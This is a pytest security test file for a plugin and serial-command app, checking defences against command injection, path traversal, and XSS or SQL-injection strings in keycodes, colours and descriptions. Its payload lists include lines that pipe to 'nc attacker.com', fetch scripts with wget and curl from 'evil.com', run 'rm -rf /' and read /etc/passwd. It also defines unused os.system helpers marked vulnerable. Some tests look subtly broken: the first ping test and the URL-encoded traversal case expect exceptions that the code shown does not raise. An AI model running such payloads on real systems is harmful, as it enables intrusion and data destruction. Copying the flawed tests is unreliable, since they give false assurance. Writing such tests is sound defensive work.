"""
Security tests for command injection vulnerabilities
"""
import pytest
import subprocess
import os
from unittest.mock import Mock, patch

try:
    from src.mac.plugins.base_plugin import BasePlugin
    from src.mac.plugins.sounds import SoundsPlugin
except ImportError:
    # Mock for testing environment
    BasePlugin = Mock
    SoundsPlugin = Mock


class TestCommandInjection:
    """Test protection against command injection attacks"""
    
    def test_ping_command_injection_basic(self):
        """Test basic command injection attempts in ping function"""
        
        def vulnerable_ping(ip):
            # This is the VULNERABLE version from original code
            return os.system(f"ping -c 1 -W 2 {ip} > /dev/null 2>&1") == 0
        
        def secure_ping(ip):
            # This is the SECURE version
            import ipaddress
            try:
                ipaddress.ip_address(ip)  # Validate IP format
                result = subprocess.run(['ping', '-c', '1', '-W', '2', ip], 
                                      capture_output=True, timeout=5)
                return result.returncode == 0
            except (ValueError, subprocess.TimeoutExpired):
                return False
        
        # Test malicious payloads
        malicious_ips = [
            "127.0.0.1; rm -rf /",           # Command chaining
            "127.0.0.1 && cat /etc/passwd",  # Command chaining  
            "127.0.0.1 | nc attacker.com 80", # Piping
            "127.0.0.1; wget malware.com/evil.sh", # Download
            "$(curl evil.com/script.sh)",    # Command substitution
            "`rm -rf /`",                    # Backtick command substitution
            "127.0.0.1 > /dev/null; echo pwned", # Redirection with command
        ]
        
        for malicious_ip in malicious_ips:
            # Secure version should reject all malicious inputs
            with pytest.raises((ValueError, subprocess.TimeoutExpired)):
                # This should fail validation or timeout
                secure_ping(malicious_ip)
        
        # Test that valid IPs still work
        valid_ips = ["127.0.0.1", "8.8.8.8", "::1", "2001:4860:4860::8888"]
        
        for valid_ip in valid_ips:
            # Should not raise exception (may return True or False based on connectivity)
            try:
                result = secure_ping(valid_ip)
                assert isinstance(result, bool)
            except (OSError, subprocess.TimeoutExpired):
                # Network issues are acceptable
                pass
    
    def test_ping_command_injection_advanced(self):
        """Test advanced command injection techniques"""
        advanced_payloads = [
            "127.0.0.1\n/bin/sh",           # Newline injection
            "127.0.0.1\r\necho injected",   # CRLF injection
            "127.0.0.1\x00/bin/sh",         # Null byte injection
            "127.0.0.1$(IFS=,;cmd=echo,injected;$cmd)", # IFS manipulation
            "127.0.0.1;{echo,injected}",    # Brace expansion
            "'127.0.0.1';echo 'injected'",  # Quote escaping
        ]
        
        def secure_ping_advanced(ip):
            import ipaddress
            import re
            
            # Additional sanitization
            if not re.match(r'^[0-9a-fA-F:.]+$', ip):
                raise ValueError("Invalid IP format")
            
            try:
                ipaddress.ip_address(ip)
                result = subprocess.run(['ping', '-c', '1', '-W', '2', ip], 
                                      capture_output=True, timeout=5)
                return result.returncode == 0
            except (ValueError, subprocess.TimeoutExpired):
                return False
        
        for payload in advanced_payloads:
            with pytest.raises(ValueError):
                secure_ping_advanced(payload)
    
    def test_filename_path_traversal(self):
        """Test path traversal protection in filename handling"""
        
        def vulnerable_file_path(filename, base_dir="/safe/directory"):
            # VULNERABLE version
            return os.path.join(base_dir, filename)
        
        def secure_file_path(filename, base_dir="/safe/directory"):
            # SECURE version
            if '..' in filename or filename.startswith('/') or '\\' in filename:
                raise ValueError("Invalid filename")
            
            filename = os.path.basename(filename)
            full_path = os.path.join(base_dir, filename)
            
            # Ensure resolved path is within base directory
            if not os.path.realpath(full_path).startswith(os.path.realpath(base_dir)):
                raise ValueError("Path traversal attempt")
            
            return full_path
        
        # Test malicious filenames
        malicious_filenames = [
            "../../../etc/passwd",           # Classic path traversal
            "..\\..\\..\\windows\\system32", # Windows path traversal
            "/etc/shadow",                   # Absolute path
            "..\\..\\..\\..\\boot.ini",      # Mixed separators
            "file../../etc/passwd",         # Embedded traversal
            "....//....//etc/passwd",       # Double encoding attempt
            "%2e%2e%2f%2e%2e%2fetc%2fpasswd", # URL encoded
        ]
        
        for malicious_filename in malicious_filenames:
            with pytest.raises(ValueError):
                secure_file_path(malicious_filename)
        
        # Test that safe filenames work
        safe_filenames = ["safe.txt", "audio.mp3", "config.json"]
        base_dir = "/tmp/test"
        
        for safe_filename in safe_filenames:
            result = secure_file_path(safe_filename, base_dir)
            assert result.startswith(base_dir)
            assert os.path.basename(result) == safe_filename
    
    def test_plugin_parameter_injection(self):
        """Test plugin parameter sanitization"""
        
        def vulnerable_plugin_exec(command, param):
            # VULNERABLE - direct execution
            return os.system(f"{command} {param}")
        
        def secure_plugin_exec(command, param):
            # SECURE - parameter validation
            allowed_commands = ['spotify.next', 'hue.toggle', 'sounds.play']
            
            if command not in allowed_commands:
                raise ValueError("Invalid command")
            
            # Sanitize parameter based on command type
            if command.startswith('sounds.'):
                # File parameter - check for path traversal
                if '..' in param or '/' in param or '\\' in param:
                    raise ValueError("Invalid sound filename")
            
            elif command.startswith('hue.'):
                # Light name parameter - alphanumeric and spaces only
                import re
                if not re.match(r'^[a-zA-Z0-9\s\']+$', param):
                    raise ValueError("Invalid light name")
            
            return f"Executing {command} with {param}"
        
        # Test command injection in parameters
        malicious_params = [
            "file.mp3; rm -rf /",
            "Light'; curl evil.com",
            "$(wget malware.com/evil.sh)",
            "`cat /etc/passwd`",
            "file.mp3 && nc attacker.com 80",
        ]
        
        for param in malicious_params:
            with pytest.raises(ValueError):
                secure_plugin_exec('sounds.play', param)
            
            with pytest.raises(ValueError):
                secure_plugin_exec('hue.toggle', param)
    
    def test_json_injection(self):
        """Test JSON injection attacks in configuration"""
        
        def vulnerable_json_parse(json_string):
            # VULNERABLE - using eval or unsafe parsing
            import ast
            return ast.literal_eval(json_string)  # Still somewhat safe
        
        def secure_json_parse(json_string):
            # SECURE - proper JSON parsing with validation
            import json
            
            try:
                data = json.loads(json_string)
                
                # Validate structure
                if not isinstance(data, dict):
                    raise ValueError("Invalid JSON structure")
                
                return data
            except json.JSONDecodeError:
                raise ValueError("Invalid JSON format")
        
        # Test malicious JSON payloads
        malicious_json = [
            '{"key": "value", "__import__": "os"}',  # Python import injection
            '{"eval": "__import__(\'os\').system(\'rm -rf /\')"}',  # Eval injection
            '{"key": "value"} and os.system("rm -rf /")',  # Code injection
        ]
        
        for json_str in malicious_json:
            # Should parse as normal JSON or reject
            try:
                result = secure_json_parse(json_str)
                # If it parses, ensure no dangerous keys
                assert "__import__" not in str(result)
                assert "eval" not in str(result) or not callable(result.get("eval"))
            except ValueError:
                # Rejection is acceptable
                pass
    
    def test_serial_command_injection(self):
        """Test serial command injection protection"""
        
        def process_serial_command_vulnerable(command):
            # VULNERABLE - direct execution of serial commands
            if command.startswith("Run: "):
                cmd = command[5:]
                return os.system(cmd)
        
        def process_serial_command_secure(command):
            # SECURE - validate command format and whitelist
            import re
            
            if command.startswith("App: "):
                app_name = command[5:]
                # Validate app name format
                if not re.match(r'^[a-zA-Z0-9\.\s_-]+$', app_name):
                    raise ValueError("Invalid app name")
                return f"Switching to {app_name}"
            
            elif command.startswith("Run: "):
                plugin_cmd = command[5:]
                # Validate plugin command format
                if not re.match(r'^[a-z]+\.[a-z_]+(\s+[a-zA-Z0-9\s\'_-]+)?$', plugin_cmd):
                    raise ValueError("Invalid plugin command")
                return f"Executing {plugin_cmd}"
            
            else:
                raise ValueError("Unknown command format")
        
        # Test malicious serial commands
        malicious_commands = [
            "Run: rm -rf /",
            "App: zoom.us; curl evil.com",
            "Run: spotify.play; wget malware.sh",
            "App: $(cat /etc/passwd)",
            "Run: `rm important.file`",
        ]
        
        for cmd in malicious_commands:
            with pytest.raises(ValueError):
                process_serial_command_secure(cmd)
        
        # Test valid commands
        valid_commands = [
            "App: zoom.us",
            "App: Google Chrome", 
            "Run: spotify.next",
            "Run: hue.toggle 'Living Room'",
            "Run: sounds.play 'notification.mp3'",
        ]
        
        for cmd in valid_commands:
            result = process_serial_command_secure(cmd)
            assert isinstance(result, str)
            assert len(result) > 0


class TestInputValidation:
    """Test input validation and sanitization"""
    
    def test_keycode_validation(self):
        """Test keycode string validation"""
        
        def validate_keycode(keycode_str):
            import re
            # Allow only alphanumeric, underscore, and plus for combinations
            if not re.match(r'^[A-Z0-9_+]+$', keycode_str):
                raise ValueError("Invalid keycode format")
            
            # Check for valid keycode patterns
            parts = keycode_str.split('+')
            valid_keys = [
                'CTRL', 'ALT', 'SHIFT', 'GUI', 'CMD',
                'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',
                'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
                'ONE', 'TWO', 'THREE', 'FOUR', 'FIVE', 'SIX', 'SEVEN', 'EIGHT', 'NINE', 'ZERO',
                'F1', 'F2', 'F3', 'F4', 'F5', 'F6', 'F7', 'F8', 'F9', 'F10', 'F11', 'F12',
                'SPACE', 'ENTER', 'TAB', 'ESCAPE', 'LEFT_ARROW', 'RIGHT_ARROW', 'UP_ARROW', 'DOWN_ARROW'
            ]
            
            for part in parts:
                if part not in valid_keys:
                    raise ValueError(f"Invalid keycode: {part}")
            
            return True
        
        # Test valid keycodes
        valid_keycodes = [
            "CTRL+A", "GUI+SHIFT+V", "F5", "SPACE", "ALT+TAB"
        ]
        
        for keycode in valid_keycodes:
            assert validate_keycode(keycode) == True
        
        # Test invalid keycodes
        invalid_keycodes = [
            "INVALID_KEY", "CTRL+; DROP TABLE", "GUI+`rm -rf /`",
            "A'; DROP TABLE users; --", "CTRL+$(whoami)"
        ]
        
        for keycode in invalid_keycodes:
            with pytest.raises(ValueError):
                validate_keycode(keycode)
    
    def test_color_validation(self):
        """Test color format validation"""
        
        def validate_color(color_str):
            import re
            if not re.match(r'^#[0-9A-Fa-f]{6}$', color_str):
                raise ValueError("Invalid color format")
            return True
        
        # Test valid colors
        valid_colors = ["#FF0000", "#00FF00", "#0000FF", "#FFFFFF", "#000000"]
        
        for color in valid_colors:
            assert validate_color(color) == True
        
        # Test invalid colors  
        invalid_colors = [
            "red", "#ZZ0000", "#FF00", "#FF0000; alert('xss')",
            "rgb(255,0,0)", "javascript:alert(1)"
        ]
        
        for color in invalid_colors:
            with pytest.raises(ValueError):
                validate_color(color)
    
    def test_description_validation(self):
        """Test description field validation"""
        
        def validate_description(desc):
            import re
            # Allow alphanumeric, spaces, basic punctuation
            if not re.match(r'^[a-zA-Z0-9\s\-_:./()]+$', desc):
                raise ValueError("Invalid description")
            
            # Prevent excessively long descriptions
            if len(desc) > 100:
                raise ValueError("Description too long")
            
            return True
        
        # Test valid descriptions
        valid_descriptions = [
            "Toggle: Audio Mute",
            "Create: New Tab", 
            "Navigate: Back",
            "Media: Play/Pause"
        ]
        
        for desc in valid_descriptions:
            assert validate_description(desc) == True
        
        # Test invalid descriptions
        invalid_descriptions = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE config; --",
            "description with \x00 null byte",
            "x" * 200,  # Too long
        ]
        
        for desc in invalid_descriptions:
            with pytest.raises(ValueError):
                validate_description(desc)